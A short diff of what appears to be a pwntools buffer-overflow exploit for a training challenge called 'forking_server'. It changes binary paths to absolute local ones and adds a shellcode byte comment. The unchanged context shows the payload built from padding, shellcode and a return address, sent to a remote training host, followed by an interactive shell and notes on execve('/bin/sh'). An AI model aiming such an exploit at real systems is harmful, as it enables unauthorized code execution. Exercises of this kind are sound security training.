@@ -13,11 +13,11 @@ returnAddr= b"\x00\x41\x40\x00\x00\x00\x00\x00"
 payload = prepadding+shellcode+padding+returnAddr
 
 if args.GDB:
-    p = gdb.debug("./forking_server", gdbscript=COMMANDS)
+    p = gdb.debug("/home/k/ODC/c8/forking_server", gdbscript=COMMANDS)
 elif args.REMOTE:
     p = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
 else:
-    p = process("./forking_server")
+    p = process("/home/k/ODC/c8/forking_server")
 
 # Send first stage loader (exactly 16 bytes)
 p.send(payload)
@@ -27,3 +27,4 @@ p.interactive()
 #execve("/bin/sh\0", NULL, NULL)
 #0x0068732f6e69622f
 
+#\x00\x00ph\x89\xe7h
